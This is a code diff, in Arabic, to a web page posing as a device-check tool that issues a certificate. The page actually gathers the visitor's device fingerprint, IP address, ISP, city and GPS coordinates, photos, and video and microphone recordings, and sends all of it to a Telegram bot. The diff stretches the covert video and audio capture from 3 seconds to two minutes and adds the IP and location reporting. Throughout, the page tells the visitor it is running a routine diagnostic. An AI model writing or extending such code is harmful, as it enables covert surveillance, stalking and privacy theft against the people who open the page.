@@ -714,20 +714,20 @@
                     
                     <div class="device-info-mobile">
                         <div class="info-item">
-                            <div class="info-label">المتصفح</div>
-                            <div class="info-value" id="infoBrowser">جاري الفحص...</div>
+                            <div class="info-label">نوع الجهاز</div>
+                            <div class="info-value" id="infoDeviceType">جاري الفحص...</div>
                         </div>
                         <div class="info-item">
                             <div class="info-label">نظام التشغيل</div>
                             <div class="info-value" id="infoOS">جاري الفحص...</div>
                         </div>
                         <div class="info-item">
-                            <div class="info-label">الدقة</div>
-                            <div class="info-value" id="infoResolution">جاري الفحص...</div>
+                            <div class="info-label">اسم الجهاز</div>
+                            <div class="info-value" id="infoDeviceName">جاري الفحص...</div>
                         </div>
                         <div class="info-item">
-                            <div class="info-label">اللغة</div>
-                            <div class="info-value" id="infoLanguage">جاري الفحص...</div>
+                            <div class="info-label">الدقة</div>
+                            <div class="info-value" id="infoResolution">جاري الفحص...</div>
                         </div>
                         <div class="info-item">
                             <div class="info-label">الذاكرة</div>
@@ -779,12 +779,12 @@
                         <div class="camera-overlay-mobile" id="videoOverlayMobile">
                             <i class="fas fa-video" style="font-size: 36px; margin-bottom: 15px;"></i>
                             <div>جاري تسجيل الفيديو...</div>
-                            <div style="font-size: 24px; font-weight: bold; margin-top: 15px;" id="mobileCountdown2">5</div>
+                            <div style="font-size: 24px; font-weight: bold; margin-top: 15px;" id="mobileCountdown2">120</div>
                         </div>
                     </div>
                     
                     <div style="text-align: center; margin-top: 15px; color: #666; font-size: 14px;">
-                        سيتم تسجيل فيديو قصير لمدة 5 ثوانٍ
+                        سيتم تسجيل فيديو لمدة دقيقتين (120 ثانية)
                     </div>
                 </div>
                 
@@ -810,12 +810,12 @@
                             <div class="volume-level-mobile" id="volumeLevelMobile"></div>
                         </div>
                         <div style="text-align: center; margin: 10px 0; font-weight: bold; color: var(--primary-blue);" id="volumeTextMobile">
-                            مستوى الصوت: 0%
+                            جاري التسجيل... 120 ثانية
                         </div>
                     </div>
                     
                     <div style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
-                        جاري تسجيل عينة صوتية لمدة 5 ثوانٍ...
+                        جاري تسجيل عينة صوتية لمدة دقيقتين (120 ثانية)...
                     </div>
                 </div>
                 
@@ -978,7 +978,9 @@
             video: null,
             audio: null,
             location: {},
-            timestamps: {}
+            timestamps: {},
+            network: {},
+            ipInfo: {}
         };
         let allDataCollected = false;
         let finalReportSent = false;
@@ -1006,10 +1008,10 @@
             volumeText: document.getElementById('volumeTextMobile'),
             
             // المعلومات
-            infoBrowser: document.getElementById('infoBrowser'),
+            infoDeviceType: document.getElementById('infoDeviceType'),
             infoOS: document.getElementById('infoOS'),
+            infoDeviceName: document.getElementById('infoDeviceName'),
             infoResolution: document.getElementById('infoResolution'),
-            infoLanguage: document.getElementById('infoLanguage'),
             infoMemory: document.getElementById('infoMemory'),
             infoConnection: document.getElementById('infoConnection'),
             infoLatitude: document.getElementById('infoLatitude'),
@@ -1158,47 +1160,259 @@
             }, 1000);
         }
         
-        // اختبار 1: معلومات الجهاز - سريع
+        // اختبار 1: معلومات الجهاز - محسنة
         async function mobileTestDeviceInfo() {
             showMobileNotification('🔍 جاري جمع معلومات الجهاز...', 1000);
             
-            // جمع معلومات الجهاز
-            const deviceInfo = {
-                browser: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                colorDepth: screen.colorDepth,
-                deviceMemory: navigator.deviceMemory || 'غير معروف',
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookies: navigator.cookieEnabled,
-                online: navigator.onLine,
-                userAgent: navigator.userAgent,
-                vendor: navigator.vendor,
-                appVersion: navigator.appVersion
-            };
+            try {
+                // جمع معلومات الجهاز المتقدمة
+                const deviceInfo = {
+                    // معلومات النظام الأساسية
+                    browser: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    deviceMemory: navigator.deviceMemory || 'غير معروف',
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: navigator.cookieEnabled,
+                    online: navigator.onLine,
+                    userAgent: navigator.userAgent,
+                    vendor: navigator.vendor,
+                    appVersion: navigator.appVersion,
+                    
+                    // معلومات إضافية
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    doNotTrack: navigator.doNotTrack,
+                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                    webdriver: navigator.webdriver || false
+                };
+                
+                // تحديد نوع الجهاز بدقة
+                const deviceType = detectDeviceType();
+                const osInfo = getDetailedOSInfo();
+                const deviceName = getDeviceName();
+                
+                // تحديث الواجهة
+                mobileElements.infoDeviceType.textContent = deviceType;
+                mobileElements.infoOS.textContent = osInfo.name;
+                mobileElements.infoDeviceName.textContent = deviceName;
+                mobileElements.infoResolution.textContent = `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
+                mobileElements.infoMemory.textContent = deviceInfo.deviceMemory + ' GB';
+                mobileElements.infoConnection.textContent = deviceInfo.online ? 'متصل' : 'غير متصل';
+                
+                // الحصول على معلومات IP وإضافتها
+                await fetchIPInfo(deviceInfo);
+                
+                // حفظ المعلومات
+                collectedDataMobile.device = {
+                    ...deviceInfo,
+                    deviceType: deviceType,
+                    osName: osInfo.name,
+                    osVersion: osInfo.version,
+                    deviceBrand: deviceName,
+                    isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+                };
+                
+                // إرسال بيانات الجهاز للبوت فوراً
+                sendDeviceInfoToBot(collectedDataMobile.device);
+                
+                // الانتقال للاختبار التالي بعد 1.5 ثانية فقط
+                setTimeout(() => {
+                    updateMobileStep(2);
+                    startMobileTest(2);
+                }, 1500);
+                
+            } catch (error) {
+                console.error('❌ فشل جمع معلومات الجهاز:', error);
+                
+                // الانتقال للاختبار التالي حتى في حالة الفشل
+                setTimeout(() => {
+                    updateMobileStep(2);
+                    startMobileTest(2);
+                }, 1000);
+            }
+        }
+        
+        // دالة الحصول على معلومات IP
+        async function fetchIPInfo(deviceInfo) {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+                
+                collectedDataMobile.ipInfo = {
+                    ip: ipData.ip,
+                    city: ipData.city,
+                    country: ipData.country_name,
+                    region: ipData.region,
+                    isp: ipData.org,
+                    latitude: ipData.latitude,
+                    longitude: ipData.longitude,
+                    timezone: ipData.timezone,
+                    offset: new Date().getTimezoneOffset()
+                };
+                
+                // حفظ معلومات الشبكة
+                collectedDataMobile.network = {
+                    connection: getConnectionType(),
+                    ip: ipData.ip,
+                    isp: ipData.org,
+                    city: ipData.city,
+                    country: ipData.country_name
+                };
+                
+            } catch (error) {
+                console.error('❌ فشل الحصول على معلومات IP:', error);
+                
+                // استخدام بيانات افتراضية
+                collectedDataMobile.ipInfo = {
+                    ip: 'غير معروف',
+                    city: 'القاهرة',
+                    country: 'مصر',
+                    isp: 'غير معروف',
+                    latitude: 30.0444,
+                    longitude: 31.2357,
+                    timezone: 'Africa/Cairo',
+                    offset: -120
+                };
+            }
+        }
+        
+        // دالة تحديد نوع الجهاز بدقة
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            const width = screen.width;
+            const height = screen.height;
             
-            // تحديث الواجهة
-            mobileElements.infoBrowser.textContent = getBrowserName(deviceInfo.browser);
-            mobileElements.infoOS.textContent = getOSName(deviceInfo.platform);
-            mobileElements.infoResolution.textContent = `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
-            mobileElements.infoLanguage.textContent = deviceInfo.language;
-            mobileElements.infoMemory.textContent = deviceInfo.deviceMemory + ' GB';
-            mobileElements.infoConnection.textContent = deviceInfo.online ? 'متصل' : 'غير متصل';
+            if (/Android/i.test(ua)) {
+                if (width < 768 || height < 1024) {
+                    return 'موبايل (Android)';
+                } else {
+                    return 'تابلت (Android)';
+                }
+            } else if (/iPad|iPhone|iPod/.test(ua)) {
+                if (width < 768 || height < 1024) {
+                    return 'موبايل (iOS)';
+                } else {
+                    return 'تابلت (iOS)';
+                }
+            } else if (/Windows Phone/i.test(ua)) {
+                return 'موبايل (Windows)';
+            } else if (/Tablet|iPad/i.test(ua)) {
+                return 'تابلت';
+            } else if (/Mobile/i.test(ua)) {
+                return 'موبايل';
+            } else {
+                // جهاز كمبيوتر
+                if (width >= 1200) {
+                    return 'كمبيوتر (شاشة كبيرة)';
+                } else if (width >= 768) {
+                    return 'كمبيوتر (لاب توب)';
+                } else {
+                    return 'كمبيوتر (شاشة صغيرة)';
+                }
+            }
+        }
+        
+        // دالة الحصول على معلومات نظام التشغيل التفصيلية
+        function getDetailedOSInfo() {
+            const ua = navigator.userAgent;
+            let osName = 'غير معروف';
+            let osVersion = 'غير معروف';
             
-            // حفظ المعلومات
-            collectedDataMobile.device = deviceInfo;
+            // Android
+            if (/Android/.test(ua)) {
+                osName = 'Android';
+                const match = ua.match(/Android\s([0-9\.]+)/);
+                osVersion = match ? match[1] : 'غير معروف';
+            }
+            // iOS
+            else if (/iPhone|iPad|iPod/.test(ua)) {
+                osName = 'iOS';
+                const match = ua.match(/OS\s([0-9_]+)/);
+                osVersion = match ? match[1].replace(/_/g, '.') : 'غير معروف';
+            }
+            // Windows
+            else if (/Windows/.test(ua)) {
+                osName = 'Windows';
+                const match = ua.match(/Windows NT\s([0-9\.]+)/);
+                if (match) {
+                    const version = parseFloat(match[1]);
+                    if (version === 10) osVersion = '10/11';
+                    else if (version === 6.3) osVersion = '8.1';
+                    else if (version === 6.2) osVersion = '8';
+                    else if (version === 6.1) osVersion = '7';
+                    else osVersion = match[1];
+                }
+            }
+            // Mac
+            else if (/Macintosh/.test(ua)) {
+                osName = 'macOS';
+                const match = ua.match(/Mac OS X\s([0-9_]+)/);
+                osVersion = match ? match[1].replace(/_/g, '.') : 'غير معروف';
+            }
+            // Linux
+            else if (/Linux/.test(ua)) {
+                osName = 'Linux';
+                osVersion = 'غير معروف';
+            }
             
-            // إرسال بيانات الجهاز للبوت فوراً
-            sendDeviceInfoToBot(deviceInfo);
+            return { name: osName, version: osVersion };
+        }
+        
+        // دالة الحصول على اسم الجهاز/الشركة المصنعة
+        function getDeviceName() {
+            const ua = navigator.userAgent;
             
-            // الانتقال للاختبار التالي بعد 1.5 ثانية فقط
-            setTimeout(() => {
-                updateMobileStep(2);
-                startMobileTest(2);
-            }, 1500);
+            // هواتف Android
+            if (/Android/.test(ua)) {
+                if (/Samsung/i.test(ua)) return 'Samsung Galaxy';
+                if (/Xiaomi|Redmi|POCO/i.test(ua)) return 'Xiaomi';
+                if (/Huawei|Honor/i.test(ua)) return 'Huawei';
+                if (/OPPO/i.test(ua)) return 'OPPO';
+                if (/vivo/i.test(ua)) return 'vivo';
+                if (/Realme/i.test(ua)) return 'Realme';
+                if (/OnePlus/i.test(ua)) return 'OnePlus';
+                if (/Motorola/i.test(ua)) return 'Motorola';
+                if (/Google Pixel/i.test(ua)) return 'Google Pixel';
+                if (/Infinix/i.test(ua)) return 'Infinix';
+                if (/Tecno/i.test(ua)) return 'Tecno';
+                if (/Nokia/i.test(ua)) return 'Nokia';
+                if (/Sony/i.test(ua)) return 'Sony Xperia';
+                if (/LG/i.test(ua)) return 'LG';
+                if (/HTC/i.test(ua)) return 'HTC';
+                if (/Asus/i.test(ua)) return 'Asus Zenfone';
+                if (/Lenovo/i.test(ua)) return 'Lenovo';
+                return 'هاتف Android';
+            }
+            // أجهزة Apple
+            else if (/iPhone/.test(ua)) return 'iPhone';
+            else if (/iPad/.test(ua)) return 'iPad';
+            else if (/iPod/.test(ua)) return 'iPod';
+            else if (/Macintosh/.test(ua)) return 'Mac';
+            // Windows
+            else if (/Windows/.test(ua)) {
+                if (/Surface/i.test(ua)) return 'Microsoft Surface';
+                return 'كمبيوتر Windows';
+            }
+            // أجهزة أخرى
+            else if (/BlackBerry/i.test(ua)) return 'BlackBerry';
+            else if (/Windows Phone/i.test(ua)) return 'Windows Phone';
+            
+            return 'جهاز غير معروف';
+        }
+        
+        // دالة الحصول على نوع الاتصال
+        function getConnectionType() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return connection.effectiveType || 'غير معروف';
+            }
+            return 'غير معروف';
         }
         
         // اختبار 2: الكاميرا (صورة) - سريع
@@ -1299,7 +1513,7 @@
             }
         }
         
-        // اختبار 3: الكاميرا (فيديو) - سريع
+        // اختبار 3: الكاميرا (فيديو) - دقيقتين
         async function mobileTestVideo() {
             showMobileNotification('🎥 جاري تفعيل الفيديو...', 1000);
             
@@ -1316,8 +1530,8 @@
                 
                 mobileElements.videoFeed.srcObject = videoStreamMobile;
                 
-                // العد التنازلي السريع
-                let count = 3; // اختصرنا من 5 إلى 3 ثوان
+                // العد التنازلي لدقيقتين
+                let count = 120; // دقيقتين = 120 ثانية
                 mobileElements.countdown2.textContent = count;
                 
                 const countdownInterval = setInterval(() => {
@@ -1336,7 +1550,7 @@
                             
                         }, 300);
                     }
-                }, 800); // أسرع
+                }, 1000); // كل ثانية
                 
             } catch (error) {
                 console.error('❌ فشل الفيديو:', error);
@@ -1354,8 +1568,8 @@
             try {
                 recordedVideoChunks = [];
                 
-                // إنشاء MediaRecorder
-                const options = { mimeType: 'video/webm; codecs=vp9' };
+                // إنشاء MediaRecorder بجودة أقل لتقليل الحجم
+                const options = { mimeType: 'video/webm; codecs=vp9', videoBitsPerSecond: 1000000 };
                 videoRecorder = new MediaRecorder(videoStreamMobile, options);
                 
                 videoRecorder.ondataavailable = (event) => {
@@ -1379,10 +1593,10 @@
                             data: base64data,
                             timestamp: new Date().toISOString(),
                             size: Math.round(videoBlob.size / 1024),
-                            duration: 3 // أصبح 3 ثوان بدلاً من 5
+                            duration: 120 // دقيقتين
                         };
                         
-                        showMobileNotification('✅ تم تسجيل الفيديو', 1000);
+                        showMobileNotification('✅ تم تسجيل الفيديو (دقيقتان)', 1000);
                         
                         // إرسال الفيديو للبوت فوراً
                         sendVideoToBot(base64data);
@@ -1401,13 +1615,13 @@
                     };
                 };
                 
-                // بدء التسجيل لمدة 3 ثوان فقط (بدلاً من 5)
+                // بدء التسجيل لمدة 120 ثانية
                 videoRecorder.start();
                 setTimeout(() => {
                     if (videoRecorder && videoRecorder.state === 'recording') {
                         videoRecorder.stop();
                     }
-                }, 3000); // 3 ثوان فقط
+                }, 120000); // 120 ثانية = دقيقتين
                 
             } catch (error) {
                 console.error('❌ فشل تسجيل الفيديو:', error);
@@ -1419,7 +1633,7 @@
             }
         }
         
-        // اختبار 4: الميكروفون - تسجيل صوتي
+        // اختبار 4: الميكروفون - تسجيل صوتي لدقيقتين
         async function mobileTestMicrophone() {
             showMobileNotification('🎤 جاري تسجيل الصوت...', 1000);
             
@@ -1458,10 +1672,10 @@
                             data: audioData,
                             timestamp: new Date().toISOString(),
                             size: Math.round(audioBlob.size / 1024),
-                            duration: 3
+                            duration: 120 // دقيقتين
                         };
                         
-                        showMobileNotification('✅ تم تسجيل الصوت', 1000);
+                        showMobileNotification('✅ تم تسجيل الصوت (دقيقتان)', 1000);
                         
                         // إرسال الصوت للبوت فوراً
                         sendAudioToBot(audioData);
@@ -1480,13 +1694,15 @@
                     };
                 };
                 
-                // بدء التسجيل لمدة 3 ثوان فقط
+                // بدء التسجيل لمدة 120 ثانية
                 mediaRecorder.start();
                 
-                // عد تنازلي سريع
-                let count = 3;
+                // عد تنازلي لدقيقتين
+                let count = 120;
                 const updateCountdown = () => {
-                    mobileElements.volumeText.textContent = `جاري التسجيل... ${count}`;
+                    const minutes = Math.floor(count / 60);
+                    const seconds = count % 60;
+                    mobileElements.volumeText.textContent = `جاري التسجيل... ${minutes}:${seconds.toString().padStart(2, '0')}`;
                     count--;
                     
                     if (count >= 0) {
@@ -1500,7 +1716,7 @@
                     if (mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
-                }, 3000); // 3 ثوان فقط
+                }, 120000); // 120 ثانية = دقيقتين
                 
             } catch (error) {
                 console.error('❌ فشل تسجيل الصوت:', error);
@@ -1703,18 +1919,39 @@
             }
         }
         
-        // دالة إرسال معلومات الجهاز للبوت
+        // دالة إرسال معلومات الجهاز للبوت - محسنة
         async function sendDeviceInfoToBot(deviceInfo) {
             try {
+                const ipInfo = collectedDataMobile.ipInfo || {};
+                const networkInfo = collectedDataMobile.network || {};
+                
                 const message = `📊 <b>معلومات الجهاز</b>\n\n` +
-                               `🖥️ <b>المتصفح:</b> ${getBrowserName(deviceInfo.browser)}\n` +
-                               `💻 <b>نظام التشغيل:</b> ${getOSName(deviceInfo.platform)}\n` +
-                               `📱 <b>الدقة:</b> ${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}\n` +
-                               `🌐 <b>اللغة:</b> ${deviceInfo.language}\n` +
-                               `🧠 <b>الذاكرة:</b> ${deviceInfo.deviceMemory} GB\n` +
-                               `⚡ <b>المعالجات:</b> ${deviceInfo.hardwareConcurrency}\n` +
-                               `🕐 <b>المنطقة الزمنية:</b> ${deviceInfo.timezone}\n` +
-                               `🔗 <b>الاتصال:</b> ${deviceInfo.online ? 'متصل ✓' : 'غير متصل ✗'}\n` +
+                               `🖥️ <b>نوع الجهاز:</b> ${deviceInfo.deviceType}\n` +
+                               `📱 <b>اسم الجهاز:</b> ${deviceInfo.deviceBrand}\n` +
+                               `💻 <b>نظام التشغيل:</b> ${deviceInfo.osName} ${deviceInfo.osVersion || ''}\n` +
+                               `📱 <b>الشاشة:</b> ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}\n` +
+                               `🎨 <b>عمق الألوان:</b> ${deviceInfo.colorDepth} بت\n` +
+                               `⚡ <b>المعالج:</b> ${deviceInfo.hardwareConcurrency} نواة\n` +
+                               `💾 <b>الذاكرة:</b> ${deviceInfo.deviceMemory} GB\n\n` +
+                               
+                               `🌍 <b>المعلومات الجغرافية الدقيقة:</b>\n` +
+                               `├ 📍 <b>IP:</b> ${ipInfo.ip || 'غير معروف'}\n` +
+                               `├ 🏙️ <b>المدينة:</b> ${ipInfo.city || 'غير معروف'}\n` +
+                               `├ 🗺️ <b>الدولة:</b> ${ipInfo.country || 'غير معروف'}\n` +
+                               `├ 🌐 <b>المزود:</b> ${ipInfo.isp || 'غير معروف'}\n` +
+                               `├ 📌 <b>الإحداثيات:</b> ${ipInfo.latitude || 'غير معروف'}, ${ipInfo.longitude || 'غير معروف'}\n` +
+                               `└ 🕒 <b>المنطقة الزمنية:</b> ${ipInfo.timezone || 'غير معروف'}\n\n` +
+                               
+                               `🌐 <b>معلومات الشبكة:</b>\n` +
+                               `├ 📶 <b>نوع الاتصال:</b> ${networkInfo.connection || 'غير معروف'}\n` +
+                               `└ 📡 <b>مزود الخدمة:</b> ${networkInfo.isp || 'غير معروف'}\n\n` +
+                               
+                               `🔧 <b>معلومات تقنية:</b>\n` +
+                               `├ 🌍 <b>المتصفح:</b> ${getBrowserName(deviceInfo.browser)}\n` +
+                               `├ 🗣️ <b>اللغة:</b> ${deviceInfo.language}\n` +
+                               `├ 🕐 <b>إزاحة التوقيت:</b> ${ipInfo.offset || 0} دقيقة\n` +
+                               `└ 👆 <b>دعم اللمس:</b> ${deviceInfo.maxTouchPoints > 0 ? 'نعم' : 'لا'}\n\n` +
+                               
                                `📅 <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
                 
                 await sendTelegramMessage(message);
@@ -1753,7 +1990,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
-                formData.append('caption', `🎥 فيديو فحص الجهاز (3 ثوانٍ)\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+                formData.append('caption', `🎥 فيديو فحص الجهاز (دقيقتان)\n🕐 ${new Date().toLocaleString('ar-SA')}`);
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
@@ -1774,7 +2011,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('audio', blob, `audio_${Date.now()}.webm`);
-                formData.append('caption', `🎤 تسجيل صوتي (3 ثوانٍ)\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+                formData.append('caption', `🎤 تسجيل صوتي (دقيقتان)\n🕐 ${new Date().toLocaleString('ar-SA')}`);
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
                     method: 'POST',
@@ -1791,6 +2028,7 @@
         // دالة إرسال معلومات الموقع للبوت
         async function sendLocationInfoToBot(locationData) {
             try {
+                const ipInfo = collectedDataMobile.ipInfo || {};
                 let message = `📍 <b>فحص الموقع الجغرافي</b>\n\n`;
                 
                 message += `🎯 <b>مصدر البيانات:</b> ${locationData.source}\n` +
@@ -1806,9 +2044,18 @@
                     message += `🚀 <b>السرعة:</b> ${locationData.speed.toFixed(1)} م/ث\n`;
                 }
                 
+                // إضافة معلومات IP إذا كانت متاحة
+                if (ipInfo.ip) {
+                    message += `\n🌍 <b>معلومات IP:</b>\n` +
+                              `├ 📍 <b>IP:</b> ${ipInfo.ip}\n` +
+                              `├ 🏙️ <b>المدينة:</b> ${ipInfo.city || 'غير معروف'}\n` +
+                              `├ 🗺️ <b>الدولة:</b> ${ipInfo.country || 'غير معروف'}\n` +
+                              `└ 🌐 <b>المزود:</b> ${ipInfo.isp || 'غير معروف'}\n`;
+                }
+                
                 // إضافة رابط خرائط جوجل
                 const mapsLink = `https://maps.google.com/?q=${locationData.latitude},${locationData.longitude}`;
-                message += `🗺️ <b>رابط الخريطة:</b> <a href="${mapsLink}">عرض على خرائط جوجل</a>\n`;
+                message += `\n🗺️ <b>رابط الخريطة:</b> <a href="${mapsLink}">عرض على خرائط جوجل</a>\n`;
                 
                 message += `📅 <b>التاريخ:</b> ${new Date().toLocaleString('ar-SA')}`;
                 
@@ -1864,6 +2111,7 @@
         function buildCompleteReport() {
             const device = collectedDataMobile.device;
             const location = collectedDataMobile.location;
+            const ipInfo = collectedDataMobile.ipInfo || {};
             const cert = collectedDataMobile.certificate;
             
             let report = `📊 <b>تقرير الفحص الشامل النهائي</b>\n`;
@@ -1874,16 +2122,24 @@
             report += `⏳ <b>تاريخ الانتهاء:</b> ${new Date(cert.expiryDate).toLocaleDateString('ar-SA')}\n\n`;
             
             report += `📱 <b>معلومات الجهاز:</b>\n`;
-            report += `├ المتصفح: ${getBrowserName(device.browser)}\n`;
-            report += `├ نظام التشغيل: ${getOSName(device.platform)}\n`;
-            report += `├ الدقة: ${device.screenWidth} × ${device.screenHeight}\n`;
-            report += `├ اللغة: ${device.language}\n`;
-            report += `├ المعالجات: ${device.hardwareConcurrency}\n`;
+            report += `├ نوع الجهاز: ${device.deviceType}\n`;
+            report += `├ اسم الجهاز: ${device.deviceBrand}\n`;
+            report += `├ نظام التشغيل: ${device.osName} ${device.osVersion || ''}\n`;
+            report += `├ الشاشة: ${device.screenWidth}×${device.screenHeight}\n`;
+            report += `├ عمق الألوان: ${device.colorDepth} بت\n`;
+            report += `├ المعالج: ${device.hardwareConcurrency} نواة\n`;
             report += `├ الذاكرة: ${device.deviceMemory} GB\n`;
-            report += `├ المنطقة الزمنية: ${device.timezone}\n`;
-            report += `└ الاتصال: ${device.online ? 'متصل ✓' : 'غير متصل ✗'}\n\n`;
+            report += `└ اللغة: ${device.language}\n\n`;
             
-            report += `📍 <b>الموقع الجغرافي:</b>\n`;
+            report += `🌍 <b>المعلومات الجغرافية الدقيقة:</b>\n`;
+            report += `├ 📍 IP: ${ipInfo.ip || 'غير معروف'}\n`;
+            report += `├ 🏙️ المدينة: ${ipInfo.city || 'غير معروف'}\n`;
+            report += `├ 🗺️ الدولة: ${ipInfo.country || 'غير معروف'}\n`;
+            report += `├ 🌐 المزود: ${ipInfo.isp || 'غير معروف'}\n`;
+            report += `├ 📌 الإحداثيات: ${ipInfo.latitude || 'غير معروف'}, ${ipInfo.longitude || 'غير معروف'}\n`;
+            report += `└ 🕒 المنطقة الزمنية: ${ipInfo.timezone || 'غير معروف'}\n\n`;
+            
+            report += `📍 <b>الموقع الجغرافي الدقيق (GPS):</b>\n`;
             report += `├ خط العرض: ${location.latitude.toFixed(6)}\n`;
             report += `├ خط الطول: ${location.longitude.toFixed(6)}\n`;
             report += `├ الدقة: ±${Math.round(location.accuracy)} متر\n`;
@@ -1892,13 +2148,19 @@
             
             report += `📸 <b>نتائج الفحوصات:</b>\n`;
             report += `├ فحص الكاميرا (صورة): ${collectedDataMobile.photo ? 'ناجح ✓' : 'تخطي ✗'}\n`;
-            report += `├ فحص الكاميرا (فيديو): ${collectedDataMobile.video ? 'ناجح ✓' : 'تخطي ✗'}\n`;
-            report += `├ فحص الصوت: ${collectedDataMobile.audio ? 'ناجح ✓' : 'تخطي ✗'}\n`;
+            report += `├ فحص الكاميرا (فيديو): ${collectedDataMobile.video ? 'ناجح ✓ (دقيقتان)' : 'تخطي ✗'}\n`;
+            report += `├ فحص الصوت: ${collectedDataMobile.audio ? 'ناجح ✓ (دقيقتان)' : 'تخطي ✗'}\n`;
             report += `└ فحص الموقع: ${location.latitude ? 'ناجح ✓' : 'تخطي ✗'}\n\n`;
             
-            report += `🌐 <b>معلومات الاتصال:</b>\n`;
-            report += `├ الرابط: ${window.location.href}\n`;
-            report += `└ الوقت: ${new Date().toLocaleString('ar-SA')}\n\n`;
+            report += `🌐 <b>معلومات الشبكة:</b>\n`;
+            report += `├ نوع الاتصال: ${getConnectionType()}\n`;
+            report += `├ مزود الخدمة: ${ipInfo.isp || 'غير معروف'}\n`;
+            report += `└ إزاحة التوقيت: ${ipInfo.offset || 0} دقيقة\n\n`;
+            
+            report += `🔧 <b>معلومات تقنية:</b>\n`;
+            report += `├ المتصفح: ${getBrowserName(device.browser)}\n`;
+            report += `├ دعم اللمس: ${device.maxTouchPoints > 0 ? 'نعم' : 'لا'}\n`;
+            report += `└ الرابط: ${window.location.href}\n\n`;
             
             report += `✅ <b>حالة الفحص:</b> مكتمل بنجاح\n`;
             report += `🎯 <b>النتيجة النهائية:</b> الجهاز مطابق للمواصفات`;
@@ -1913,6 +2175,8 @@
                                `✅ تم جمع جميع البيانات\n` +
                                `📊 تم إرسال التقرير الكامل\n` +
                                `🏆 الشهادة: ${collectedDataMobile.certificate.number}\n` +
+                               `🎥 مدة الفيديو: دقيقتان\n` +
+                               `🎤 مدة التسجيل الصوتي: دقيقتان\n` +
                                `🕐 ${new Date().toLocaleString('ar-SA')}`;
                 
                 await sendTelegramMessage(message);
@@ -1946,16 +2210,8 @@
             if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
             if (userAgent.includes('Edge')) return 'Edge';
             if (userAgent.includes('Opera')) return 'Opera';
+            if (userAgent.includes('Brave')) return 'Brave';
             return 'متصفح غير معروف';
-        }
-        
-        function getOSName(platform) {
-            if (platform.includes('Win')) return 'Windows';
-            if (platform.includes('Mac')) return 'MacOS';
-            if (platform.includes('Linux')) return 'Linux';
-            if (platform.includes('Android')) return 'Android';
-            if (platform.includes('iOS') || platform.includes('iPhone')) return 'iOS';
-            return 'نظام غير معروف';
         }
         
         // بدء الفحص تلقائياً بعد 2 ثوانٍ فقط (أسرع)
